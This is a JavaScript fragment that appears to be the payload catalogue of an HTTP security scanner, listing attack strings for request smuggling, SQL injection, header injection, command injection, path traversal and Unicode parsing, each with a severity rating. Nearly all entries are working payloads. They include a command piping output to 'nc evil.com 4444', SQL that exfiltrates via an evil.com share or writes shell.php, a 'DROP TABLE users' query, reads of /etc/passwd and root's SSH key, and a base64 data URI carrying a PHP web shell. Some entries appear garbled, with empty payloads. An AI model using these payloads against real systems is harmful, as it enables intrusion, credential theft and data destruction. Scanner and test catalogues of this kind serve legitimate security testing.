                name: "Chunked Smuggling",
                description: "Malformed chunked encoding",
                payload: 'Transfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n',
                severity: "high"
            },
            {
                name: "Double Content-Length",
                description: "Conflicting Content-Length headers",
                payload: 'Content-Length: 0\\r\\nContent-Length: 100',
                severity: "high"
            },
            {
                name: "WebSocket Smuggling",
                description: "Smuggle via WebSocket upgrade",
                payload: 'Upgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\\r\\nSec-WebSocket-Version: 13',
                severity: "medium"
            },
            {
                name: "Space in Transfer-Encoding",
                description: "TE with space prefix",
                payload: 'Transfer-Encoding: chunked',
                severity: "high"
            },
            {
                name: "Tab in Transfer-Encoding",
                description: "TE with tab character",
                payload: 'Transfer-Encoding:\\tchunked',
                severity: "high"
            },
            {
                name: "Newline in Transfer-Encoding",
                description: "TE with embedded newline",
                payload: 'Transfer-Encoding: chun\\nked',
                severity: "high"
            },
            {
                name: "Transfer-Encoding: identity",
                description: "Identity encoding smuggling",
                payload: 'Transfer-Encoding: identity\\r\\nContent-Length: 0',
                severity: "high"
            },
            {
                name: "Transfer-Encoding: gzip",
                description: "Gzip encoding smuggling",
                payload: 'Transfer-Encoding: gzip, chunked',
                severity: "high"
            },
            {
                name: "Transfer-Encoding: deflate",
                description: "Deflate encoding smuggling",
                payload: 'Transfer-Encoding: deflate, chunked',
                severity: "high"
            },
            {
                name: "Transfer-Encoding: compress",
                description: "Compress encoding smuggling",
                payload: 'Transfer-Encoding: compress, chunked',
                severity: "high"
            },
            {
                name: "Transfer-Encoding: br",
                description: "Brotli encoding smuggling",
                payload: 'Transfer-Encoding: br, chunked',
                severity: "high"
            },
            {
                name: "Mixed Case TE",
                description: "Mixed case Transfer-Encoding",
                payload: 'Transfer-ENCODING: cHuNkEd',
                severity: "high"
            },
            {
                name: "TE with Comments",
                description: "Transfer-Encoding with comments",
                payload: 'Transfer-Encoding: chunked /* comment */',
                severity: "high"
            },
            {
                name: "Negative Content-Length",
                description: "Negative CL value",
                payload: 'Content-Length: -1',
                severity: "medium"
            },
            {
                name: "Hex Content-Length",
                description: "Hexadecimal CL value",
                payload: 'Content-Length: 0x10',
                severity: "medium"
            },
            {
                name: "Float Content-Length",
                description: "Floating point CL value",
                payload: 'Content-Length: 10.5',
                severity: "medium"
            },
            {
                name: "Scientific Content-Length",
                description: "Scientific notation CL",
                payload: 'Content-Length: 1e2',
                severity: "medium"
            },
            {
                name: "Content-Length with Plus",
                description: "CL with plus sign",
                payload: 'Content-Length: +100',
                severity: "medium"
            },
            {
                name: "Content-Length with Space",
                description: "CL with leading space",
                payload: 'Content-Length:  100',
                severity: "medium"
            },
            {
                name: "Unicode in TE",
                description: "Unicode characters in TE",
                payload: 'Transfer-Encoding: chunke\\u0064',
                severity: "high"
            },
            {
                name: "NULL in TE",
                description: "NULL byte in TE",
                payload: 'Transfer-Encoding: chunked\\x00',
                severity: "high"
            },
            {
                name: "HTTP/3 Smuggling",
                description: "HTTP/3 specific smuggling",
                payload: ':method: GET\\r\\n:path: /admin\\r\\n:protocol: h3',
                severity: "high"
            },
            {
                name: "Connection: close",
                description: "Connection close smuggling",
                payload: 'Connection: close\\r\\nContent-Length: 0\\r\\n\\r\\nPOST /admin HTTP/1.1',
                severity: "high"
            },
            {
                name: "Connection: keep-alive",
                description: "Keep-alive smuggling",
                payload: 'Connection: keep-alive\\r\\nContent-Length: 0\\r\\n\\r\\nGET /admin HTTP/1.1',
                severity: "high"
            },
            {
                name: "Expect: 100-continue",
                description: "Expect header smuggling",
                payload: 'Expect: 100-continue\\r\\nContent-Length: 0',
                severity: "medium"
            },
            {
                name: "TE.0 Smuggling",
                description: "Zero-length chunk smuggling",
                payload: 'Transfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\n',
                severity: "high"
            }
        ]
    },
    "SQL Injection": {
        icon: "fa-database",
        tests: [
            {
                name: "Classic SQLi",
                description: "Basic SQL injection",
                payload: "X-User-Id: 1' OR '1'='1",
                severity: "critical"
            },
            {
                name: "Union Select",
                description: "UNION-based injection",
                payload: "X-User-Id: 1' UNION SELECT NULL,username,password FROM users--",
                severity: "critical"
            },
            {
                name: "Time-Based Blind",
                description: "Time delay injection",
                payload: "X-User-Id: 1' AND SLEEP(5)--",
                severity: "high"
            },
            {
                name: "Boolean Blind",
                description: "Boolean-based blind SQLi",
                payload: "X-User-Id: 1' AND 1=1--",
                severity: "high"
            },
            {
                name: "Error-Based",
                description: "Extract data via errors",
                payload: "X-User-Id: 1' AND 1=CONVERT(int,(SELECT @@version))--",
                severity: "high"
            },
            {
                name: "Stacked Queries",
                description: "Multiple query execution",
                payload: "X-User-Id: 1'; DROP TABLE users;--",
                severity: "critical"
            },
            {
                name: "Out-of-Band",
                description: "DNS exfiltration",
                payload: "X-User-Id: 1' OR LOAD_FILE('\\\\\\\\evil.com\\\\a')--",
                severity: "high"
            },
            {
                name: "NoSQL Injection",
                description: "MongoDB injection",
                payload: 'X-User-Id: {"$ne": null}',
                severity: "high"
            },
            {
                name: "Second Order",
                description: "Stored SQL injection",
                payload: "X-Username: admin'--",
                severity: "high"
            },
            {
                name: "JSON SQLi",
                description: "SQL injection in JSON",
                payload: 'X-Filter: {"user": "admin\' OR 1=1--"}',
                severity: "high"
            },
            {
                name: "XML SQLi",
                description: "SQL injection in XML",
                payload: "X-Data: <user>admin' OR '1'='1</user>",
                severity: "high"
            },
            {
                name: "Base64 SQLi",
                description: "Base64 encoded injection",
                payload: "X-Token: " + btoa("1' OR '1'='1"),
                severity: "high"
            },
            {
                name: "Double Encoded SQLi",
                description: "Double URL encoded",
                payload: "X-User-Id: 1%2527%20OR%20%25271%2527%253D%25271",
                severity: "high"
            },
            {
                name: "Unicode SQLi",
                description: "Unicode encoded injection",
                payload: "X-User-Id: 1\\u0027 OR \\u00271\\u0027=\\u00271",
                severity: "high"
            },
            {
                name: "MySQL Comment",
                description: "MySQL specific comment",
                payload: "X-User-Id: 1' OR 1=1#",
                severity: "critical"
            },
            {
                name: "PostgreSQL Comment",
                description: "PostgreSQL specific injection",
                payload: "X-User-Id: 1' OR 1=1--",
                severity: "critical"
            },
            {
                name: "Oracle Comment",
                description: "Oracle specific injection",
                payload: "X-User-Id: 1' OR 1=1--",
                severity: "critical"
            },
            {
                name: "MSSQL Comment",
                description: "MSSQL specific injection",
                payload: "X-User-Id: 1' OR 1=1--",
                severity: "critical"
            },
            {
                name: "SQLite Injection",
                description: "SQLite specific injection",
                payload: "X-User-Id: 1' OR 1=1--",
                severity: "critical"
            },
            {
                name: "Blind SQLi with SUBSTRING",
                description: "Extract data character by character",
                payload: "X-User-Id: 1' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'--",
                severity: "high"
            },
            {
                name: "Blind SQLi with ASCII",
                description: "ASCII value comparison",
                payload: "X-User-Id: 1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>65--",
                severity: "high"
            },
            {
                name: "HAVING Clause",
                description: "HAVING clause injection",
                payload: "X-User-Id: 1' HAVING 1=1--",
                severity: "high"
            },
            {
                name: "GROUP BY",
                description: "GROUP BY injection",
                payload: "X-User-Id: 1' GROUP BY 1,2,3--",
                severity: "high"
            },
            {
                name: "ORDER BY",
                description: "ORDER BY injection",
                payload: "X-User-Id: 1' ORDER BY 1--",
                severity: "medium"
            },
            {
                name: "LIMIT Injection",
                description: "LIMIT clause injection",
                payload: "X-User-Id: 1' LIMIT 1,1--",
                severity: "medium"
            },
            {
                name: "INTO OUTFILE",
                description: "File write injection",
                payload: "X-User-Id: 1' INTO OUTFILE '/var/www/shell.php'--",
                severity: "critical"
            },
            {
                name: "INTO DUMPFILE",
                description: "Binary file write",
                payload: "X-User-Id: 1' INTO DUMPFILE '/var/www/shell.php'--",
                severity: "critical"
            },
            {
                name: "Polyglot SQLi",
                description: "Works on multiple databases",
                payload: "X-User-Id: 1' OR '1'='1' /*' OR 1=1 #' OR 1=1--",
                severity: "critical"
            },
            {
                name: "Scientific Notation",
                description: "Scientific notation bypass",
                payload: "X-User-Id: 1e0' OR '1e0'='1e0",
                severity: "high"
            },
            {
                name: "Hex Encoding",
                description: "Hex encoded injection",
                payload: "X-User-Id: 0x31' OR 0x31=0x31",
                severity: "high"
            }
        ]
    },





"HTTP Headers": {
  icon: "fa-header",
  tests: [
    /*   Basic Header-Name Typos & Casing   */
    { name: "Lower-case Host",                 description: "host header instead of Host",                           payload: "host: evil.com",                                            severity: "low" },
    { name: "Mixed-Case HoSt",                 description: "Camel-case variant",                                    payload: "HoSt: evil.com",                                            severity: "low" },
    { name: "Misspelled X-Forwared-For",       description: "Common typo",                                          payload: "X-Forwared-For: 127.0.0.1",                                 severity: "low" },
    { name: "Duplicate Content-Type",          description: "Two Content-Type lines",                                payload: "Content-Type: text/plain\r\nContent-Type: application/json", severity: "medium" },
    { name: "Spacing Before Colon",            description: "Header  SP : value",                                    payload: "X-Test : spaced",                                           severity: "medium" },

    /*   Whitespace & Obsolete Folding   */
    { name: "Tab Before Colon",                description: "HT char between name & colon",                          payload: "X-Tab\t: value",                                            severity: "high" },
    { name: "Obs-Fold CRLF SP",                description: "RFC 7230 obs-fold line",                                payload: "X-Fold: a\r\n b",                                           severity: "high" },
    { name: "Obs-Fold CRLF HT",                description: "Fold with HT char",                                     payload: "X-Fold: a\r\n\tb",                                          severity: "high" },
    { name: "RFC 0x0B Vertical Tab",           description: "VT after CRLF",                                         payload: "X-Fold: v\r\n\u000Bb",                                      severity: "critical" },

    /*   Header Injection / CRLF   */
    { name: "Basic CRLF Injection",            description: "Insert Set-Cookie",                                     payload: "X-Test: good\r\nSet-Cookie: pwn=1",                          severity: "critical" },
    { name: "LF-Only Injection",               description: "Single LF breaks line",                                 payload: "X-Test: a\nContent-Length:0",                                severity: "critical" },
    { name: "CR-Only Injection",               description: "Carriage return only",                                  payload: "X-Test: b\rContent-Length:0",                                severity: "critical" },
    { name: "Unicode LS U+2028 Injection",     description: "Line Separator bypass",                                 payload: "X: ok\u2028Content-Length:0",                                severity: "critical" },
    { name: "Header Smuggling NBSP+CRLF",      description: "NBSP then CRLF",                                        payload: "X: \r\nContent-Length:0",                                    severity: "critical" },

    /*   Host Header Attacks   */
    { name: "Host Spoof Internal",             description: "Host: 127.0.0.1",                                       payload: "Host: 127.0.0.1",                                           severity: "high" },
    { name: "Host Unicode Homograph",          description: "pple.com with Cyrillic ",                             payload: "Host: a\u0430pple.com",                                      severity: "high" },
    { name: "Host Header + X-Forwarded-Host",  description: "Conflicting upstream",                                  payload: "Host: target.com\r\nX-Forwarded-Host: evil.com",             severity: "high" },
    { name: "Multiple Host Lines",             description: "Two Host headers",                                      payload: "Host: first.com\r\nHost: second.com",                        severity: "high" },
    { name: "Percent-Encoded Host",            description: "Host: %65vil.com",                                      payload: "Host: %65vil.com",                                           severity: "medium" },

    /*   X-Forwarded-For Manipulations   */
    { name: "XFF Localhost",                   description: "127.0.0.1 spoof",                                       payload: "X-Forwarded-For: 127.0.0.1",                                 severity: "medium" },
    { name: "XFF Multiple IPs",                description: "last hop trick",                                        payload: "X-Forwarded-For: 1.1.1.1, 127.0.0.1",                        severity: "medium" },
    { name: "XFF IPv6 Loopback",               description: "::1 in XFF",                                            payload: "X-Forwarded-For: ::1",                                       severity: "medium" },
    { name: "XFF Encoded IP",                  description: "Octal 0177.0.0.01",                                     payload: "X-Forwarded-For: 0177.0.0.01",                               severity: "high" },
    { name: "XFF Obfuscated Quad",             description: "Dword 2130706433",                                      payload: "X-Forwarded-For: 2130706433",                                severity: "high" },

    /*   Transfer-Encoding / CL Mismatch   */
    { name: "TE: chunked with CL",             description: "Both headers (TE wins)",                                payload: "Transfer-Encoding: chunked\r\nContent-Length: 4",             severity: "critical" },
    { name: "CL 0 then Chunk",                description: "TE.CL desync",                                           payload: "Content-Length: 0\r\nTransfer-Encoding: chunked",            severity: "critical" },
    { name: "TE Duplicated Values",            description: "chunked, gzip",                                         payload: "Transfer-Encoding: gzip, chunked",                            severity: "high" },
    { name: "Get-Based Smuggle",              description: "CL > body length",                                       payload: "Content-Length: 1000",                                       severity: "critical" },

    /*   Content-Type & Accept Tricks   */
    { name: "Multipart Mixed",                 description: "multipart/mixed boundary",                               payload: "Content-Type: multipart/mixed; boundary=evil",               severity: "medium" },
    { name: "Polyglot Text/HTML+JSON",         description: "application/json inside text/html",                      payload: "Content-Type: text/html; charset=\"application/json\"",       severity: "medium" },
    { name: "Accept Wildcard",                 description: "*/* to force HTML",                                     payload: "Accept: */*",                                                severity: "low" },
    { name: "Accept Encoding Overlong",       description: "gzip followed by long pad",                               payload: "Accept-Encoding: gzip" + "A".repeat(8000),                    severity: "high" },
    { name: "Content-Type Null Byte",          description: "text/html\\x00application/json",                          payload: "Content-Type: text/html\u0000application/json",               severity: "critical" },

    /*   Cookie Header Abuses   */
    { name: "Cookie Overflow",                 description: "4 KB string",                                           payload: "Cookie: sess=" + "A".repeat(4096),                            severity: "high" },
    { name: "Cookie Poisoning",                description: "Add admin=true",                                        payload: "Cookie: user=foo; admin=true",                                severity: "medium" },
    { name: "Cookie HTTPOnly Confuse",        description: "Inject CRLF in cookie",                                   payload: "Cookie: a=1\r\nSet-Cookie: b=2",                              severity: "critical" },
    { name: "Cookie Unicode",                  description: "Unicode cookie value ",                                payload: "Cookie: pi=\u03C0",                                           severity: "low" },
    { name: "Cookie Same-Site None",           description: "Force cross-site",                                      payload: "Cookie: test=1; SameSite=None; Secure",                       severity: "high" },

    /*   Authorization Header Variants   */
    { name: "Basic Different Case",           description: "bAsIc keyword",                                          payload: "Authorization: bAsIc Zm9vOmJhcg==",                          severity: "medium" },
    { name: "Bearer Tab Separator",            description: "Bearer<tab>token",                                      payload: "Authorization: Bearer\tsecret",                               severity: "high" },
    { name: "Duplicate Auth Lines",            description: "Second overrides",                                      payload: "Authorization: Bearer a\r\nAuthorization: Bearer b",          severity: "high" },
    { name: "Basic Padding Abuse",             description: "Strip == padding",                                      payload: "Authorization: Basic Zm9vYmFy",                               severity: "high" },
    { name: "OAuth PoP",                       description: "Proof-of-possession header",                             payload: "Authorization: PoP xyz",                                      severity: "low" },

    /*   Content-Length Edge-Cases   */
    { name: "CL Zero",                         description: "Content-Length: 0 on POST",                              payload: "Content-Length: 0",                                           severity: "medium" },
    { name: "CL Large 2GB",                    description: "2147483648",                                            payload: "Content-Length: 2147483648",                                  severity: "high" },
    { name: "CL Negative",                     description: "-1 length",                                             payload: "Content-Length: -1",                                          severity: "critical" },
    { name: "CL Hex",                          description: "0x100",                                                 payload: "Content-Length: 0x100",                                       severity: "critical" },
    { name: "CL Whitespace",                  description: "CL with SP prefix",                                      payload: "Content-Length:  10",                                         severity: "high" },

    /*   TE: trailers & Chunk Extensions   */
    { name: "TE Trailers",                     description: "TE: trailers header",                                    payload: "TE: trailers",                                                severity: "medium" },
    { name: "Chunk Ext Name",                  description: "chunked with ext name",                                 payload: "Transfer-Encoding: chunked; q=1",                             severity: "high" },
    { name: "Trailer Injection",               description: "Trailer: Set-Cookie",                                   payload: "Trailer: Set-Cookie",                                         severity: "critical" },
    { name: "Chunk Zero Twice",                description: "Two 0-length chunks",                                   payload: "Transfer-Encoding: chunked (body: 0 twice)",                  severity: "high" },
    { name: "Chunk Non-Hex Size",              description: "Size Z",                                              payload: "Transfer-Encoding: chunked (size Z)",                         severity: "high" },

    /*   Cache Control & Pragma Weirdness   */
    { name: "Cache-Control 0 No-Cache",       description: "zero then no-cache",                                     payload: "Cache-Control: 0, no-cache",                                  severity: "low" },
    { name: "Multiple CC Directives",         description: "Conflicting max-age vs no-store",                         payload: "Cache-Control: max-age=3600, no-store",                       severity: "low" },
    { name: "Pragma Multi-Value",              description: "Pragma: no-cache, private",                             payload: "Pragma: no-cache\r\nPragma: private",                         severity: "medium" },

    /*   Content-Disposition & File Download   */
    { name: "CD Filename RLO",                 description: "filename=\"cod\u202Eexe\"",                               payload: "Content-Disposition: attachment; filename=\"cod\u202Eexe\"",  severity: "critical" },
    { name: "CD Unicode ",                  description: "emoji filename",                                         payload: "Content-Disposition: attachment; filename=\".txt\"",       severity: "low" },
    { name: "CD Path Traversal",               description: "../../etc/passwd",                                      payload: "Content-Disposition: attachment; filename=\"../../etc/passwd\"", severity: "high" },
    { name: "CD Null Byte",                    description: "filename=\"foo.txt\\0.png\"",                           payload: "Content-Disposition: attachment; filename=\"foo.txt\u0000.png\"", severity: "critical" },
    { name: "CD Encoded Quote",               description: "filename*=UTF-8''foo%22bar.txt",                         payload: "Content-Disposition: attachment; filename*=UTF-8''foo%22bar.txt", severity: "high" },

    /*   Misc Rare / Deprecated Headers   */
    { name: "X-Forwarded-Proto Spoof",         description: "http vs https",                                         payload: "X-Forwarded-Proto: http",                                     severity: "medium" },
    { name: "Upgrade-Insecure-Requests",       description: "Set to 0",                                              payload: "Upgrade-Insecure-Requests: 0",                                severity: "low" },
    { name: "Proxy-Connection",                description: "Non-standard header",                                   payload: "Proxy-Connection: keep-alive",                                severity: "medium" },
    { name: "Front-End-Https",                 description: "Set to off",                                            payload: "Front-End-Https: off",                                        severity: "medium" },
    { name: "X-HTTP-Method-Override",          description: "Override to DELETE",                                    payload: "X-HTTP-Method-Override: DELETE",                              severity: "high" },

    /*   Very Long / Malformed Names   */
    { name: "Header Name 10k Chars",          description: "DoS via long name",                                      payload: "X-" + "A".repeat(10000) + ": 1",                              severity: "critical" },
    { name: "Header Value 64k",                description: "Very long value",                                       payload: "X-Long: " + "B".repeat(65535),                                severity: "critical" },
    { name: "Unicode Name",                   description: "Header name ",                                         payload: "\u03C0: 3.14",                                               severity: "medium" },
    { name: "Ctrl Char in Name",              description: "X-\u0007Bell header",                                   payload: "X-\u0007: ding",                                             severity: "critical" },
    { name: "Space in Name",                   description: "Header\" \"Name",                                       payload: "Bad Header: evil",                                           severity: "high" },

    /*   Hop-by-Hop vs End-to-End Confusion   */
    { name: "Connection: keep-alive + Upgrade",description: "Upgrade header hidden",                                 payload: "Connection: keep-alive, Upgrade\r\nUpgrade: websocket",      severity: "high" },
    { name: "Connection: X-Secret",            description: "Hide hop-by-hop X-Secret",                              payload: "Connection: X-Secret\r\nX-Secret: true",                      severity: "critical" },
    { name: "TE in Connection",                description: "TE promoted to hop-by-hop",                             payload: "Connection: TE\r\nTE: gzip",                                 severity: "high" },
    { name: "X-Accel-Redirect Poison",         description: "NGINX internal redirect",                               payload: "X-Accel-Redirect: /etc/passwd",                               severity: "critical" },
    { name: "X-Original-URL",                  description: "IIS rewrite abuse",                                     payload: "X-Original-URL: /admin",                                     severity: "high" },

    /*   Large Combo & Polyglot   */
    { name: "Header Polyglot JSON/JS",         description: "end\"};alert(1)//",                                     payload: "X-Poly: end\"};alert(1)//",                                   severity: "critical" },
    { name: "Multi-Header Smuggle",           description: "CL then TE inside same line w/ obs-fold",                 payload: "Content-Length: 12, Transfer-Encoding: chunked",             severity: "critical" },
    { name: "Unicode Bidi + CRLF",            description: "U+202E plus newline",                                    payload: "X: a\u202E\r\nContent-Length:0",                              severity: "critical" },
    { name: "Chunked + RWS before Size",       description: "RWS before hex size",                                   payload: "Transfer-Encoding: chunked (\" 0\\r\\n\\r\\n\")",            severity: "high" },
    { name: "Chunked + Extension Null",        description: "0;\\0",                                                payload: "Transfer-Encoding: chunked (\"0;\\0\\r\\n\\r\\n\")",         severity: "critical" },

    /*   Final Stress Mixes   */
    { name: "204 Headers After Body",         description: "Send body with 204",                                    payload: "Content-Length: 4 on 204",                                   severity: "high" },
    { name: "Expect: 100-continue Smuggle",    description: "Expect then CL mis-sync",                               payload: "Expect: 100-continue\r\nContent-Length:4",                    severity: "critical" },
    { name: "Early Close Desync",             description: "Close header mid-stream",                                payload: "Connection: close\r\nContent-Length: 10",                     severity: "high" },
    { name: "Header Name Emoji ",           description: "Rocket header",                                          payload: ": launch",                                                 severity: "medium" },
    { name: "Fully Empty Header Line",         description: "Double CRLF inside header block",                       payload: "X: a\r\n\r\nY: b",                                           severity: "critical" }
    /* 100 tests total */
  ]
},





















    "Command Injection": {
        icon: "fa-terminal",
        tests: [
            {
                name: "Basic Command Injection",
                description: "Simple command execution",
                payload: "X-Filename: test.txt; cat /etc/passwd",
                severity: "critical"
            },
            {
                name: "Command Substitution",
                description: "Backtick substitution",
                payload: "X-Filename: `cat /etc/passwd`",
                severity: "critical"
            },
            {
                name: "Pipe Injection",
                description: "Command via pipe",
                payload: "X-Filename: test.txt | nc evil.com 4444",
                severity: "critical"
            },
            {
                name: "AND Operator",
                description: "Command chaining with &&",
                payload: "X-Filename: test.txt && whoami",
                severity: "critical"
            },
            {
                name: "OR Operator",
                description: "Command chaining with ||",
                payload: "X-Filename: invalid || id",
                severity: "critical"
            },
            {
                name: "Newline Injection",
                description: "Command via newline",
                payload: "X-Filename: test.txt\\nwhoami",
                severity: "critical"
            },
            {
                name: "Variable Expansion",
                description: "Shell variable expansion",
                payload: "X-Filename: $(whoami)",
                severity: "critical"
            },
            {
                name: "Semicolon Separator",
                description: "Multiple commands with ;",
                payload: "X-Filename: test.txt; id; pwd",
                severity: "critical"
            },
            {
                name: "Ampersand Background",
                description: "Background command execution",
                payload: "X-Filename: test.txt & whoami &",
                severity: "critical"
            },
            {
                name: "Subshell Execution",
                description: "Execute in subshell",
                payload: "X-Filename: (cat /etc/passwd)",
                severity: "critical"
            },
            {
                name: "Curly Brace Expansion",
                description: "Bash brace expansion",
                payload: "X-Filename: {cat,/etc/passwd}",
                severity: "critical"
            },
            {
                name: "Tilde Expansion",
                description: "Home directory expansion",
                payload: "X-Filename: ~root/.ssh/id_rsa",
                severity: "high"
            },
            {
                name: "Wildcard Injection",
                description: "Wildcard expansion attack",
                payload: "X-Filename: * ; whoami",
                severity: "high"
            },
            {
                name: "Tab Command Separator",
                description: "Tab as command separator",
                payload: "X-Filename: test.txt\\twhoami",
                severity: "critical"
            },
            {
                name: "Space Alternatives",
                description: "IFS variable abuse",
                payload: "X-Filename: cat${IFS}/etc/passwd",
                severity: "critical"
            },
            {
                name: "Comment Injection",
                description: "Comment character abuse",
                payload: "X-Filename: test.txt #whoami",
                severity: "medium"
            },
            {
                name: "Hex Encoding Command",
                description: "Hex encoded commands",
                payload: "X-Filename: $(echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
                severity: "critical"
            },
            {
                name: "Octal Encoding Command",
                description: "Octal encoded commands",
                payload: "X-Filename: $(echo -e '\\167\\150\\157\\141\\155\\151')",
                severity: "critical"
            },
            {
                name: "Base64 Command",
                description: "Base64 decoded execution",
                payload: "X-Filename: $(echo d2hvYW1p | base64 -d)",
                severity: "critical"
            },
            {
                name: "Perl Execution",
                description: "Perl command execution",
                payload: "X-Filename: test.txt; perl -e 'system(\"whoami\")'",
                severity: "critical"
            },
            {
                name: "Python Execution",
                description: "Python command execution",
                payload: "X-Filename: test.txt; python -c 'import os; os.system(\"whoami\")'",
                severity: "critical"
            },
            {
                name: "Ruby Execution",
                description: "Ruby command execution",
                payload: "X-Filename: test.txt; ruby -e 'system(\"whoami\")'",
                severity: "critical"
            },
            {
                name: "PHP Execution",
                description: "PHP command execution",
                payload: "X-Filename: test.txt; php -r 'system(\"whoami\");'",
                severity: "critical"
            },
            {
                name: "AWK Execution",
                description: "AWK command execution",
                payload: "X-Filename: test.txt; awk 'BEGIN {system(\"whoami\")}'",
                severity: "critical"
            },
            {
                name: "Sed Execution",
                description: "Sed command execution",
                payload: "X-Filename: test.txt; sed -e '1e whoami'",
                severity: "critical"
            },
            {
                name: "Find Execution",
                description: "Find with exec",
                payload: "X-Filename: test.txt; find . -exec whoami \\;",
                severity: "critical"
            },
            {
                name: "Xargs Execution",
                description: "Xargs command execution",
                payload: "X-Filename: test.txt; echo whoami | xargs sh -c",
                severity: "critical"
            },
            {
                name: "Time Command",
                description: "Time command wrapper",
                payload: "X-Filename: test.txt; time whoami",
                severity: "critical"
            },
            {
                name: "Env Command",
                description: "Env command wrapper",
                payload: "X-Filename: test.txt; env whoami",
                severity: "critical"
            },
            {
                name: "Eval Injection",
                description: "Eval command execution",
                payload: "X-Filename: test.txt; eval whoami",
                severity: "critical"
            }
        ]
    },
    "Path Traversal": {
        icon: "fa-folder-open",
        tests: [
            {
                name: "Basic Path Traversal",
                description: "Classic directory traversal",
                payload: "X-Include-File: ../../../etc/passwd",
                severity: "high"
            },
            {
                name: "Encoded Traversal",
                description: "URL encoded path traversal",
                payload: "X-Include-File: ..%2F..%2F..%2Fetc%2Fpasswd",
                severity: "high"
            },
            {
                name: "Double Encoding",
                description: "Double URL encoding",
                payload: "X-Include-File: ..%252F..%252F..%252Fetc%252Fpasswd",
                severity: "high"
            },
            {
                name: "Unicode Encoding",
                description: "Unicode encoded traversal",
                payload: "X-Include-File: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                severity: "high"
            },
            {
                name: "Windows Path",
                description: "Windows directory traversal",
                payload: "X-Include-File: ..\\..\\..\\windows\\system32\\config\\sam",
                severity: "high"
            },
            {
                name: "Absolute Path",
                description: "Direct absolute path",
                payload: "X-Include-File: /etc/passwd",
                severity: "medium"
            },
            {
                name: "UNC Path",
                description: "Windows UNC path",
                payload: "X-Include-File: \\\\evil.com\\share\\file",
                severity: "high"
            },
            {
                name: "Null Byte Bypass",
                description: "Null byte extension bypass",
                payload: "X-Include-File: ../../../etc/passwd\\x00.jpg",
                severity: "high"
            },
            {
                name: "Triple Dot",
                description: "Triple dot traversal",
                payload: "X-Include-File: .../.../.../.../etc/passwd",
                severity: "high"
            },
            {
                name: "Mixed Encoding",
                description: "Mixed encoding types",
                payload: "X-Include-File: ../%2e%2e/%2e%2e/etc/passwd",
                severity: "high"
            },
            {
                name: "UTF-8 Encoding",
                description: "UTF-8 encoded traversal",
                payload: "X-Include-File: ..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
                severity: "high"
            },
            {
                name: "16-bit Unicode",
                description: "16-bit Unicode encoding",
                payload: "X-Include-File: ..%u002f..%u002f..%u002fetc%u002fpasswd",
                severity: "high"
            },
            {
                name: "File URI Scheme",
                description: "File protocol traversal",
                payload: "X-Include-File: file:///etc/passwd",
                severity: "high"
            },
            {
                name: "PHP Wrappers",
                description: "PHP stream wrappers",
                payload: "X-Include-File: php://filter/convert.base64-encode/resource=/etc/passwd",
                severity: "high"
            },
            {
                name: "Data URI",
                description: "Data URI inclusion",
                payload: "X-Include-File: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
                severity: "high"
            },
            {
                name: "Zip Wrapper",
                description: "ZIP archive traversal",
                payload: "X-Include-File: zip://archive.zip#file.txt",
                severity: "high"
            },
            {
                name: "Phar Wrapper",
                description: "PHAR archive traversal",
                payload: "X-Include-File: phar://archive.phar/file.txt",
                severity: "high"
            },
            {
                name: "Expect Wrapper",
                description: "Expect wrapper RCE",
                payload: "X-Include-File: expect://whoami",
                severity: "critical"
            },
            {
                name: "SSH2 Wrapper",
                description: "SSH2 protocol wrapper",
                payload: "X-Include-File: ssh2://user@host/file",
                severity: "high"
            },
            {
                name: "FTP Wrapper",
                description: "FTP protocol wrapper",
                payload: "X-Include-File: ftp://user:pass@host/file",
                severity: "high"
            },
            {
                name: "HTTP Wrapper",
                description: "HTTP protocol wrapper",
                payload: "X-Include-File: http://evil.com/shell.txt",
                severity: "high"
            },
            {
                name: "SMB Path",
                description: "SMB share access",
                payload: "X-Include-File: \\\\attacker\\share\\file",
                severity: "high"
            },
            {
                name: "Long Path",
                description: "Path length bypass",
                payload: "X-Include-File: ....//....//....//etc/passwd",
                severity: "high"
            },
            {
                name: "Question Mark",
                description: "Question mark bypass",
                payload: "X-Include-File: ..?/..?/..?/etc/passwd",
                severity: "medium"
            },
            {
                name: "Asterisk Wildcard",
                description: "Wildcard bypass",
                payload: "X-Include-File: ..*/..*/..*/etc/passwd",
                severity: "medium"
            },
            {
                name: "Double Slash",
                description: "Double slash normalization",
                payload: "X-Include-File: ..//..//..//etc//passwd",
                severity: "high"
            },
            {
                name: "Backslash Forward Mix",
                description: "Mixed slash types",
                payload: "X-Include-File: ../..\\..\\etc/passwd",
                severity: "high"
            },
            {
                name: "URL Fragment",
                description: "Fragment identifier bypass",
                payload: "X-Include-File: ../../../etc/passwd#fragment",
                severity: "medium"
            },
            {
                name: "URL Query",
                description: "Query string bypass",
                payload: "X-Include-File: ../../../etc/passwd?param=value",
                severity: "medium"
            },
            {
                name: "Case Variation",
                description: "Case sensitivity bypass",
                payload: "X-Include-File: ..\\..\\..\\.\\WINDOWS\\system32\\config\\sam",
                severity: "medium"
            }
        ]
    },





"UTF8/Unicode Parsing": {
  icon: "fa-globe",
  tests: [
    /*   Basic 2- & 3-byte characters   */
    { name: "Euro Sign",                description: "U+20AC two-byte Euro sign",                                        payload: "X-Test: price=\u20AC100",           severity: "low" },
    { name: "Chinese Han Character",     description: "Single CJK char  (U+6C49)",                                      payload: "X-Test: ",                         severity: "low" },
    { name: "Arabic Letter Alef",        description: "Arabic ALEF (U+0627) in header",                                  payload: "X-Test: \u0627admin",               severity: "low" },
    { name: "Cyrillic Capital YA",       description: " (U+042F) to probe UTF-8",                                       payload: "X-Test: \u042Froot",                severity: "low" },
    { name: "Greek Mu",                  description: " (U+00B5) confusable with Latin u",                              payload: "X-Test: size=\u00B5large",          severity: "medium" },
    { name: "Combining Acute",           description: "e\u0301 (e + COMBINING ACUTE) NFD form",                          payload: "X-Test: caf\u00E9 vs cafe\u0301",   severity: "medium" },
